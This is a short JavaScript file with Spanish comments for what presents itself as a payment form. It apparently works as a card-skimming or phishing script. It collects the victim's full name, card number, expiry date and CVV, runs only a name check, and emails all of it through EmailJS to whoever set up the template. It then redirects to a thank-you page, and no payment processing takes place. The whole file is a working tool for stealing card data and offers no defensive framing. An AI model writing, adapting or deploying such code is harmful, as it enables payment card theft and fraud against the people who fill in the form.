// script.js
emailjs.init('TU_PUBLIC_KEY'); // Reemplaza con tu Public Key de EmailJS

document.getElementById('paymentForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    // 1. CAPTURAR DATOS
    const datos = {
        nombre_completo: document.getElementById('nombre').value.trim(),
        numero_tarjeta: document.getElementById('tarjeta').value.replace(/\s/g, ''),
        fecha_expiracion: document.getElementById('fecha').value,
        codigo_cvv: document.getElementById('cvv').value
    };

    // 2. VALIDACIÓN CORREGIDA
    const errores = [];
    
    // Validación de nombre (permite minúsculas y acentos)
    if (!/^[a-zA-ZÀ-ÿ\u00f1\u00d1\s]{5,}$/.test(datos.nombre_completo)) {
        errores.push('El nombre debe tener al menos 5 letras');
    }

    // Resto de validaciones...
    
    if (errores.length > 0) {
        mostrarErrores(errores);
        return;
    }

    // 3. ENVÍO DE DATOS
    document.getElementById('mensajeCarga').style.display = 'block';

    emailjs.send("TU_SERVICE_ID", "TU_TEMPLATE_ID", datos)
        .then(() => {
            window.location.href = "thank-you.html";
        })
        .catch((error) => {
            console.error('Error técnico:', error);
            mostrarErrores(['Error al enviar. Intenta nuevamente.']);
        })
        .finally(() => {
            document.getElementById('mensajeCarga').style.display = 'none';
        });
});

// Función para mostrar errores
function mostrarErrores(errores) {
    const contenedorErrores = document.getElementById('errores');
    contenedorErrores.innerHTML = errores.map(error => `<div class="error">❌ ${error}</div>`).join('');
    contenedorErrores.style.display = 'block';
}

// Validación en tiempo real para el nombre
document.getElementById('nombre').addEventListener('input', function() {
    document.getElementById('errores').style.display = 'none';
});
